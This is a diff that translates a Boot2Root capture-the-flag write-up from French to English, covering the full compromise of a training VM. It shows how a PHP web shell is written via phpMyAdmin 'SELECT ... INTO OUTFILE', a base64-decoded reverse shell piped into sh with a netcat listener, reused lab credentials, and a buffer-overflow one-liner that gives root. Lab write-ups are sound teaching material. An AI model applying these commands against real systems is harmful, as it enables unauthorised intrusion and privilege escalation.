@@ -1,262 +1,243 @@
-# Boot2Root -- Normal Route
+# Boot2Root -- Professor Layton
 
-## Step 1 - Trouver le serveur
-On a pas l'IP du serveur.
-On lance un `nmap -sn <mask>` pour énumerer les serveurs qui répondent au ping
+## Step 1 - Find the server
+We don't have the server IP.
+We run `nmap -sn <mask>` to enumerate servers responding to ping.
 
-Heureusement on trouve une IP différente de la notre qui répond au ping
+Fortunately, we find an IP different from ours that responds to ping.
 
 ## Step 2 - Enumerer
-### Hote et services
-On lance alors on `nmap -p- -A -sV -T4 <ip>` pour obtenir un max d'info sur le serveur
+### Host and services
+Now, we run `nmap -p- -A -sV -T4 <ip>` to gather maximum information about the server.
 
-        On y trouve différent services:
-        - ftp sur le port 21 (vsftpd 2.0.8 or later)
-        - ssh sur le port 22 (OpenSSH 5.9p1)
-        - http(s) sur le port 80 et 443 (Apache httpd 2.2.22)
-        - imap(s) sur le port 143 et 993 (Dovecot imapd)
+We discover various services:
+- `ftp` on port 21 (`vsftpd 2.0.8` or later)
+- `ssh` on port 22 (`OpenSSH 5.9p1`)
+- `http`(s) on ports 80 and 443 (`Apache httpd 2.2.22`)
+- `imap`(s) on ports 143 and 993 (`Dovecot imapd`)
 
-        On conserve le log sous le coude au cas ou on puisse en tirer plus d'infos utiles.
+We keep the log handy in the event it provides additional useful information.
 
 ### HTTP
-        On décide de commencer par le serveur http(s)
-        On lance alors `nikto` sur le port 80, et on ne tire rien de bien probant pour le moment
-        On essaie alors en https, et la on obtient plus d'infos
+We decide to start with the HTTP(S) server.
+We run `nikto` on port 80, but it doesn't yield significant results.
+Trying in HTTPS, we obtain more information.
 
-        Différentes routes
-        - `/forum`
-        - `/phpmyadmin`
-        - `/webmail`
-        La plupart des routes nosu donnent des pistes a explorer.
+Different routes are found:
+- `/forum`
+- `/phpmyadmin`
+- `/webmail`
+Most of these routes give us leads to explore.
 
 #### PHPMyAdmin
-        On décide d'aller vers le plus évident: PHPMyAdmin
+We choose to explore PHPMyAdmin.
 
-        En allant sur la route `/phpmyadmin` on trouve deux infos intéressantes:
-        - L'URL de l'image contient un token `token=3e6cab1c9cf8cda6115b523f5d6b353`
-        - En cliquant sur le bouton d'aide du formulaire de login, on a accès au numéro de version de PHPMyAdmin
-        a savoir `3.4.10.1`
+Going to the `/phpmyadmin` route, we find two interesting pieces of information:
+- The image URL contains a token `token=3e6cab1c9cf8cda6115b523f5d6b353`
+- Clicking the login form's help button reveals the `PHPMyAdmin` version: `3.4.10.1`
 
-        De la page d'aide on deviner quelques infos supplémentaires
-        - PHP version 5.2.0 minimum
-        - MySQL Version 5.0 minimum
-        - Extension ZIP de PHP
+From the help page, we deduce additional information:
+- PHP version 5.2.0 minimum
+- MySQL Version 5.0 minimum
+- PHP ZIP extension
 
 #### Webmail
-        On va ensuite voir le webmail
-        sur la route `/webmail` on trouve sur la page d'accueil la version `1.4.22`
+Next, we check the webmail.
+On the `/webmail` route, the homepage displays `squirrelmail` version `1.4.22`.
 
 #### Forum
-        On va ensuite voir le forum
+We proceed to inspect the forum.
 
-        On identifie la brique de forum: `my little forum`
-        
-        En appuyant sur le lien `Users` on découvre que l'on peut envoyer des mails à `admin`
-        Il y a aussi un formulaire de contact, un potentiel endroit a exploiter.
+We identify the forum software: `my little forum`.
+
+Clicking the `Users` link, we discover the ability to send emails to `admin`.
+There's also a contact form, a potential spot to exploit.
 
 ## Step 3 - Poteaux
-En énumérant les posts on en voit un appelé `Probleme login ?` qui contient des logs ssh
-On peut voir que quelqu'un a pu se connecter en ssh sous l'utilisateur `admin`
-et que l'on peut aussi se connecter en tant que `root`.
+While enumerating posts, we find one titled
+> Probleme login ?
+containing SSH logs. We observe that someone successfully connected via
+SSH as the user `admin` and that we can also connect as `root`.
 
-On liste les différents utilisateurs du forum:
-- admin
-- lmezard
-- qudevide
-- zaz
-- wandre
-- thor
+We list the different forum users:
+- `admin`
+- `lmezard`
+- `qudevide`
+- `zaz`
+- `wandre`
+- `thor`
 
-Et on y trouve un mot de passe a la ligne suivante :
-` Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2`
-Autant que la string `!q\]Ej?*5K5cy*AJ` est identifiée comme utilisateur, on devine facilement que ça devrait etre un mot de passe
+In the SSH logs, we find a password in the line:
+`Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2`
+Even if in the logs `!q\]Ej?*5K5cy*AJ` is considered as a user, we deduce it might be a password.
 
-En essayant ce mdp un peu partout (ssh puis forum) avec tous les users connus,
-on trouve que ce mdp appartient à lmezard sur le forum.
+After trying this password with all known users (SSH and forum),
+we find it belongs to the forum user `lmezard`.
 
-En essayant ce mdp un peu partout (ssh puis forum) avec tous les users connus,
-on trouve que ce mdp appartient à lmezard sur le forum.
+From lmezard's user page, we discover the email address laurie@borntosec.net.
 
-Depuis la page utilisateur de lmezard, on trouve son mail
-`laurie@borntosec.net`
+We attempt to log in to their webmail via the `/webmail` route with the same password,
+and it works!
 
-On tente alors de se connecter a son webmail via la route `/webmail`
-avec le meme mot de passe et ça fonctionne !
+We read the DB Access email containing credentials
+`root:Fg-'kKXBj87E:aJ$` presumably for the database or PHPMyAdmin.
 
-on lit le mail `DB Access`, il contient le couple d'identifiants
-`root:Fg-'kKXBj87E:aJ$` qui devrait correspondre aux identifiants de la DB, ou de phpmyadmin
-
-on tente alors de se connecter a PHPMyadmin, succes
-On explore alors un peu, on tente d'identifer les hash des mots de passe, sans succes
-on passe lmezard en admin du forum, ça ne nous aide pas plus...
+We successfully log in to PHPMyAdmin, but efforts to identify password hashes are unsuccessful.
+Promoting lmezard to admin on the forum doesn't help that much either...
 
 ## Step 4 - Reverse shell
+After extensive searching and experimentation, we devise a plan:
 
-Apres beaucoup de temps a chercher et tenter des trucs, on a une idée:
+Use the PHPMyAdmin query console to create a PHP reverse shell and execute it through the webserver user.
+The challenge is not knowing where to write and execute a script.
 
-Utiliser la query console phpmyadmin pour créer un reverse shell php et le lancer via "forum"
-Le probleme etant qu'on ne sait pas ou on peux ecrire, ni ou ecrire pour lancer un script
+We download the corresponding version of `my little forum` found on the admin's `Update` page, version 2.3.4.
+(Being a admin turned out to be useful)
 
-On télécharge alors my little forum a la version correspondante,
-trouvée sur la page "update" du mode admin (finalement ça aura servi), qui est `2.3.4`
+We attempt to explore the forum's directory structure, mirroring what we downloaded.
+The seemingly only path that allows us to execute PHP is `/forum/templates_c/<file>.php`.
 
-Et on tente d'explorer l'arborescence du forum, en mirroir avec ce qu'on a téléchargé.
-Le seul chemin qui nous permettait à priori de lancer du php est le chemin `/forum/templates_c/<fichier>.php`
-
-On tente alors d'ecrire a cet endroit, d'abord avec un `phpinfo()` pour tester
-En supposant que le forum est rangé dans `/var/www/forum`
+We try writing there, starting with `phpinfo()` for testing
+Supposing that the forum is in `/var/www/forum`
 
 ```SQL
 SELECT '<?php phpinfo() ?>' INTO OUTFILE "/var/www/forum/templates_c/info_file.php"
 ```
-Et ça fonctionne ! Acceder a `https://<ip>/forum/templates_c/info_file.php` renvoie bien les infos sur PHP
+It works! Accessing `https://<ip>/forum/templates_c/info_file.php` shows PHP information.
 
-On fait alors la meme avec un fichier qui va ecouter le query parameter `cmd`,
-l'executer dans un shell et nous renvoyer le resultat:
+Next, we create a file that listens for the `cmd` query parameter, executes it in a shell, and returns the result:
 
 ```SQL
 SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE "/var/www/forum/templates_c/shell.php"
 ```
-(trouvable dans `scripts/shell.php`)
+(located in `scripts/shell.php`)
 
-On accede ensuite a `https://<ip>/forum/templates_c/shell.php?cmd=whoami` pour tester si ça fonctionne
-on reçoit `www-data` ça fonctionne donc bien.
+We access `https://<ip>/forum/templates_c/shell.php?cmd=whoami` to test, and it returns `www-data`, indicating success.
 
-On sonde un peu pour avoir plus d'infos, notamment la présence ou non de python,
-python est bien présent (`which python` retourne un resultat concluant)
+Further exploration reveals Python's presence (which python returns a positive result).
 
-On tente alors un script python de reverse shell connu (trouvable dans `scripts/shell.py.sh`),
-mais par precaution pour eviter tout soucis avec des caracteres non gérés
-on le passe en base64 puis on url encode la commande suivante
-
+We try a known Python reverse shell script (found in `scripts/shell.py.sh`).
+As a precaution against problematic characters, we encode it in base64 and URL encode the following command
 ```
 printf "<reverse shell en base64>" | base64 -d | sh
 ```
-Ça décode code en base64 et puis ça le lance dans shell
+This decodes the base64 and executes it in `sh`.
 
-De notre coté on lance netcat en mode écoute avec la commande suivante:
+Simultaneously, we launch netcat in listening mode on our side with the command:
 ```
 nc -nlvp <PORT>
 ```
 
-On lance le script grace a notre fichier PHP et hop, ça fonctionne !
+Running the script using our PHP file, and it works!
 
-On stabilise le shell a l'aide du protocole suivant:
+We stabilize the shell using the following protocol:
 ```
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
-puis CTRL-Z
+then CTRL-Z
 ```
 stty raw -echo; fg
 ```
-et enfin
+and finally
 ```
 export TERM=xterm
 ```
 
-On a maintenant un reverse shell propre sur le serveur.
+Now, we have a clean reverse shell on the server.
 
 ## Step 5 - Sanitize
 
-Une fois sur le serveur on explore un peu.
-Notre première trouvaille intéressante est dans `/home`
-on y trouve le dossier `LOOKATME` qui est le seul dossier accessible.
-Dedans on voit un fichier `password` nous donnant les credentials suivant:
-`lmezard:G!@M6f4Eatau{sF" `
+On the server, we explore a bit.
+Our first interesting find is in /home - the folder LOOKATME is the only accessible directory.
+Inside, we find a password file giving us credentials: lmezard:G!@M6f4Eatau{sF" .
 
-On essaie ses credentials en ssh puis en ftp,
-succès sur le ftp. On explore ce qui est a disposition, deux fichiers
-`fun` et `README`
+We try these credentials for SSH and FTP, and FTP is successful. Exploring the available files, we find two: fun and README.
 
-On les télécharge sur notre machine et on comprend par le readme que c'est un puzzle
+We download them to our machine, and the README indicates a puzzle:
 > Complete this little challenge and use the result as password for user 'laurie' to login in ssh
 
-en faisant la commande `file` sur le fichier `fun`, on y comprend que c'est une archive tar.
-on l'extrait et on regarde son contenu.
+Using `file` command on the `fun` file, we determine it's a tar archive.
+We extract it and inspect the contents.
 
-Plein de fichiers PCAP contenant des portions d'un programme en C.
-Les fichiers sont dans le désordre mais son numérotés.
-A l'aide de du script `merge.py` on remet les fichiers dans l'ordre et on les concatene
-dans un seul fichier.
+We find many PCAP files containing portions of a C program. The files are out of order but numbered.
+Using the `scripts/puzzles/merge.py` script, we reorder and concatenate them into a single file.
 
-On retire les données poubelles avec `sanitize.sh`, et encore un peu de traitement a la main.
-On compile le programme et hop
+We clean up unwanted data with sanitize.sh and do some manual processing.
+We compile the program, run it and voila:
 
 ```
 MY PASSWORD IS: Iheartpwnage
 Now SHA-256 it and submit
 ```
 
-on s'execute et ça fonctionne, on est connectés en ssh en tant que laurie
+We proceed as indicated, which gives us this password for `laurie`
 (mdp: `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`)
 
-Depuis le compte de laurie, on trouve deux fichiers, bomb et readme, encore une enignme.
+From laurie's account, we find two files: `bomb` and `readme`, another puzzle...
 
 ## Step 6 - Da bomb
-La bombe a 6 niveaux, chaque niveau a son code. Le mot de passe de thor correspond
-aux 6 codes cote a cote.
+The bomb consists of 6 levels, each with its own password.
+thor's password corresponds to the 6 codes side by side.
 
-Notre premier reflexe est de décompile le code avec radare2 et gihdra, selon nos préférences.
+Our initial thought is to decompile the code using `radare2` and `Ghidra`, based on our preferences.
 
-Certains niveaux sont plutot simples, ne constituent que d'une string écrite en clair
-d'autres sont des algorithmes plus complexes.
+Some levels are relatively simple, just containing a plain text string,
+while others involve more complex algorithms.
 
-Nous avons porté les codes dans le script `defuser.py`. Celui contient ou les solutions en dur
-ou l'algorithme inversé qui permet d'obtenir le code.
+We wrote the codes in the `scripts/puzzles/defuser.py` script,
+which includes either hard-coded solutions or the reverse algorithm to obtain the code.
 
-Le seul vraiment complexe est le niveau 6, nous avons deviné qu'il fallait
-une combinaison de 6 chiffres uniques allant de 1 a 6 inclus.
+The only truly complex level is 6, where we guessed that the code
+is a combination of 6 unique numbers ranging from 1 to 6 and that starts by 4.
 
-Nous avons alors mis en place un script qui désamorce la bombe, en tentant
-les combinaisons possibles. Petit hic, bien que la bombe soit désarmocée
-le mot de passe ne fonctionne pas...
-(voir `defuser.bash` et `defuser.py`)
+We then implemented a script to defuse the bomb by trying out all possible combinations.
+However, despite successfully defusing the bomb, the password doesn't seem to work...
+(see `defuser.bash` and `defuser.py`)
 
 ### Secret phase
-Après pas mal d'essais et de dépatouillage:
+After numerous attempts and troubleshooting:
 
-En regardant le code décompilé, nous avons constaté qu'il existe une phase secrete
-accessible en rajoutant "austinpowers" a la 4eme phase
+Upon examining the decompiled code, we discovered the existence of a secret phase
+accessible by adding "austinpowers" to the 4th phase.
+Although we couldn't find the password for the secret phase,
+experimenting with substitutions of the level 6 password led us to this password for thor:
 
-On a pas trouvé le mdp de la phase secrete, mais en tentant des substitutions du mot de passe
-de la 6 on trouve ce mot de passe pour thor:
+> Publicspeakingisveryeasy.126241207201b2149opekmq426135
 
-`Publicspeakingisveryeasy.126241207201b2149opekmq426135`
-Cette partie est très étrange et personne n'a réellement trouvé d'eux même,
-A chaque fois, le mot de passe apparait par magie...
+This part is quite peculiar, and no other student seem to have really figured it out on their own.
+Every time, the password appears magically...
 
 ## Step 7 - Tourne et retourne
+We encounter a file with instructions.
+The filename and instructions easily lead us to believe it's code for the turtle library in Python.
+We convert the instructions into code using a few sed commands,
+execute it, and observe `SLASH`.
 
-On lit un fichier avec des instructions,
-Le nom du fichier et les instructions nous permettent facilement de deviner qu'il s'agit
-de code pour la librairie `turtle` de `python`. On convertit alors les instructions en code
-avec quelques coups de `sed`, on lance et on lit `SLASH`.
-
-La fin du fichier nous dit
+Towards the end of the file, it says:
 > Can you digest this message
 
-On devine qu'on doit faire un digest md5 du message, ça nous donne le mdp
-`646da671ca01bb5d84dbb5fb2238dc8e` pour zaz.
+We deduce that we should compute an MD5 digest of the message. This gives us
+`646da671ca01bb5d84dbb5fb2238dc8e` as a password for zaz.
 
 Super nickel !
 
 ## Step 8 - Piscine a débordement
 
-On trouve un binaire nommé `exploit_me`.
-En le décompilant on constate que ça ne fait que `strcopy` l'entrée utilisateur
-dans un buffer limité et ça le print. C'est la porte d'entrée pour un buffer overflow.
+We come across an executable named `exploit_me`.
+Decompiling it reveals that it only performs a `strcpy` of the user input into a limited buffer
+and prints it. This sets the stage for a buffer overflow.
 
-On s'instruit sur comment faire.
-Avec un peu d'exploration avec radare2 et gdb on choppe l'addresse de `system()` et de `/bin/sh`
-
-Ce qui nous donne ce shellcode:
+We educate ourselves on how to proceed.
+With a bit of exploration using `radare2` and `gdb`,
+we identify the addresses for `system()` and `/bin/sh`.
+This leads us to the following shellcode:
 ```
 ./exploit_me `python -c "print('A' * 140 + '\x60\xb0\xe6\xb7AAAA\x58\xcc\xf8\xb7')"`
 ```
 
-Et bim on est root.
+And voila, we are root.
 
 ## Sources
 Buffer overflow: https://beta.hackndo.com/buffer-overflow/
-Oneliners de reverse shell: https://0xss0rz.github.io/2020-05-10-Oneliner-shells/
-Stabiliser un reverse shell: https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal
+reverse shell Oneliners: https://0xss0rz.github.io/2020-05-10-Oneliner-shells/
+Stabilize a reverse shell: https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal
